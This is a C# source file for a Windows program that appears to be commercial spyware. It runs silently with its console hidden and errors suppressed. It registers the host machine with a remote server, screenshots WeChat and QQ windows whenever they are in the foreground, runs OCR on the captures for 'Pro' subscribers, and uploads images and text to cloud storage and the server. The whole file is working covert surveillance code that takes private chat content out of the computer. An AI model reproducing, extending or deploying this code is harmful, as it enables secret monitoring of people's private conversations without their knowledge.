using Newtonsoft.Json.Linq;
using PaddleOCRSharp;
using ScreenshotHelper.Dtos;
using ScreenshotHelper.S3;
using ScreenshotHelper.Utils;
using System;
using System.Collections.Generic;
using System.Configuration;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.Sockets;
using System.Runtime;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace ScreenshotHelper
{
    internal class Program
    {
        private static string[] _targetWindowTitles = { "微信", "QQ" }; // 替换为需要检测的窗口标题

        private static S3Config _r2Config;

        private static OCRModelConfig _ocrConfig = null;
        private static OCRParameter _ocrParameter;
        private static PaddleOCREngine _ocrEngine;

        private static string _apiKey = AppConfigHelper.GetAppSetting("ApiKey");
        private static string _server = AppConfigHelper.GetAppSetting("Server");

        private static string _token = "";
        private static int _clientId = 0;

        static void Main(string[] args)
        {
            //while (true) 
            //{
            //    Thread.Sleep(20000);
            //    CaptureAndUpload();
            //}
            try
            {
                SetDpiAwareness();
                Init();

                _ocrParameter = new OCRParameter();
                _ocrEngine = new PaddleOCREngine(_ocrConfig, _ocrParameter);
                FreeConsole();
                Console.SetOut(new StreamWriter(Stream.Null));
                Console.SetError(new StreamWriter(Stream.Null));
                CaptureAndUpload();
            }
            catch (Exception)
            {
            }
            
        }

        /// <summary>
        /// 初始化
        /// </summary>
        public static void Init()
        {
            _token = AppConfigHelper.GetAppSetting("Token");
            _clientId = Convert.ToInt32(AppConfigHelper.GetAppSetting("ClientId"));
            var lastAskTimeStr = AppConfigHelper.GetAppSetting("LastAskTime");
            var lastAskTime = DateTime.MinValue;
            if (!string.IsNullOrEmpty(lastAskTimeStr))
            {
                DateTime.TryParse(lastAskTimeStr, out lastAskTime);
            }
            var interval = DateTime.Now - lastAskTime;

            if ((string.IsNullOrEmpty(_token) && interval > TimeSpan.FromHours(1)) || interval > TimeSpan.FromHours(24))
            {
                var systemInfo = SystemInfoHelper.GetSystemInfo();
                var registerDto = new RegisterDto
                {
                    ApiKey = _apiKey,
                    MachineCode = systemInfo.MachineCode,
                    ComputerName = systemInfo.ComputerName,
                    OperatingSystem = systemInfo.DisplayVersion,
                    SystemVersion = systemInfo.SystemVersion
                };

                var url = _server + "/client/register";
                var httpHelper = new HttpClientHelper();
                var result = httpHelper.PostJson<RegisterDto, ApiResult<RegisterResultDto>>(url, registerDto);

                if (result.IsSuccess && result.Data != null)
                {
                    AppConfigHelper.SetAppSetting("Token", result.Data.Token);
                    AppConfigHelper.SetAppSetting("ClientId", result.Data.Id.ToString());
                    _token = result.Data.Token;
                    _clientId = result.Data.Id;
                    AppConfigHelper.SetAppSetting("PackageType", result.Data.PackageType);
                    AppConfigHelper.SetAppSetting("ExpiryDate", result.Data.ExpiryDate.ToString("yyyy-MM-dd HH:mm:ss"));

                    LoadR2Config();
                }

                var askTimeStr = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
                AppConfigHelper.SetAppSetting("LastAskTime", askTimeStr);
            }
            else 
            { 
                LoadR2Config();
            }
        }

        private static void LoadR2Config()
        {
            var url = _server + "/r2config/getmyconfig";
            var headers = new Dictionary<string, string>
            {
                ["Authorization"] = $"Bearer {_token}"
            };
            var httpHelper = new HttpClientHelper();
            var result = httpHelper.Get<ApiResult<R2ConfigDto>>(url, headers);
            if (result.IsSuccess && result.Data.Buckets.Count > 0)
            {
                var data = result.Data;
                _r2Config = new S3Config
                {
                    ServiceUrl = data.EndPoint,
                    AccessKey = data.AccessId,
                    SecretKey = data.AccessSecret,
                    BucketName = data.Buckets[0].Name,
                    Provider = S3Provider.CloudflareR2,
                    ForcePathStyle = false
                };
            }
        }



        private static void CaptureAndUpload()
        {
            if (_r2Config == null)
            {
                return;
            }
            var packageType = AppConfigHelper.GetAppSetting("PackageType");
            var expiryDateStr = AppConfigHelper.GetAppSetting("ExpiryDate");
 
            if (string.IsNullOrEmpty(_token) || string.IsNullOrEmpty(expiryDateStr) || string.IsNullOrEmpty(packageType))
            {
                return;
            }
            DateTime.TryParse(expiryDateStr, out DateTime expiryDate);
            if (expiryDate < DateTime.Now)
            {
                return;
            }
            if (IsTargetWindowOpen(out string target))
            {
                try
                {
                    // 截图并上传
                    var screenshot = CaptureWindow();
                    string ocrStr = "";
                    if (packageType == "Pro")
                    {
                        //OCR
                        try
                        {
                            using (var stream = new MemoryStream(screenshot))
                            {
                                Bitmap bitmap = new Bitmap(stream);
                                OCRResult ocrResult = _ocrEngine.DetectText(bitmap);
                                ocrStr = ocrResult.Text;
                            }
                        }
                        catch (Exception)
                        {
                        }
                        
                    }
                    using (var storage = new S3Storage(_r2Config))
                    {
                        var key = $"{_clientId}/screenshot_{DateTime.Now.ToString("yyyyMMdd_HHmmss")}.png";
                        var response = storage.UploadBytes(screenshot, key, "image/png");
                        if (response.HttpStatusCode == HttpStatusCode.OK)
                        {
                            var dto = new ScreenshotAddDto()
                            {
                                ClientId = _clientId,
                                ScreenshotDate = DateTime.Now,
                                Source = target,
                                FileSize = screenshot.Length,
                                FileName = key,
                                OcrContent = ocrStr
                            };
                            var url = _server + "/screenshot/add";
                            var headers = new Dictionary<string, string>
                            {
                                ["Authorization"] = $"Bearer {_token}"
                            };
                            var httpHelper = new HttpClientHelper();
                            var result = httpHelper.PostJson<ScreenshotAddDto, ApiResult<bool>>(url, dto, headers);
                            if (result.IsSuccess && result.Data)
                            {
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                }
            }
        }



        //// <summary>
        /// 检测窗口是否打开
        /// </summary>
        /// <param name="windowTitle"></param>
        /// <returns></returns>
        private static bool IsTargetWindowOpen(out string target)
        {
            target = "";
            IntPtr foregroundHwnd = GetForegroundWindow();
            StringBuilder title = new StringBuilder(256);
            GetWindowText(foregroundHwnd, title, title.Capacity);
            var isTarget = false;
            foreach (var winTitle in _targetWindowTitles)
            {
                if (title.ToString().Contains(winTitle))
                {
                    isTarget = true;
                    target = winTitle;
                    break;
                }
                ;
            }
            return isTarget;
        }

        /// <summary>
        /// 截图功能
        /// </summary>
        /// <returns></returns>
        private static byte[] CaptureWindow()
        {
            IntPtr hWnd = GetForegroundWindow();
            if (hWnd == IntPtr.Zero) return null;

            GetWindowRect(hWnd, out RECT rect);
            int width = rect.Right - rect.Left;
            int height = rect.Bottom - rect.Top;

            using (Bitmap bmp = new Bitmap(width, height))
            using (Graphics g = Graphics.FromImage(bmp))
            {
                g.CopyFromScreen(rect.Left, rect.Top, 0, 0, new Size(width, height));
                using (MemoryStream ms = new MemoryStream())
                {
                    bmp.Save(ms, System.Drawing.Imaging.ImageFormat.Png);
                    return ms.ToArray();
                }
            }
        }

        public enum DpiAwareness
        {
            Unaware = 0,
            SystemAware = 1,
            PerMonitorAware = 2
        }

        static void SetDpiAwareness()
        {
            if (Environment.OSVersion.Version.Major >= 6)
            {
                try
                {
                    // Windows 8.1+ 使用SetProcessDpiAwareness
                    SetProcessDpiAwareness((int)DpiAwareness.PerMonitorAware);
                }
                catch
                {
                    // Windows 7/8 使用SetProcessDPIAware
                    SetProcessDPIAware();
                }
            }
        }


        // Windows API 定义
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

        [DllImport("user32.dll")]
        private static extern bool GetWindowRect(IntPtr hWnd, out RECT lpRect);

        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        // 获取窗口标题
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

        [DllImport("kernel32.dll")]
        private static extern bool FreeConsole();


        // 设置DPI感知模式
        [DllImport("user32.dll")]
        static extern bool SetProcessDPIAware(); // Windows 7/8

        [DllImport("shcore.dll")]
        static extern int SetProcessDpiAwareness(int value); // Windows 8.1+


        [StructLayout(LayoutKind.Sequential)]
        private struct RECT
        {
            public int Left;
            public int Top;
            public int Right;
            public int Bottom;
        }
    }
}
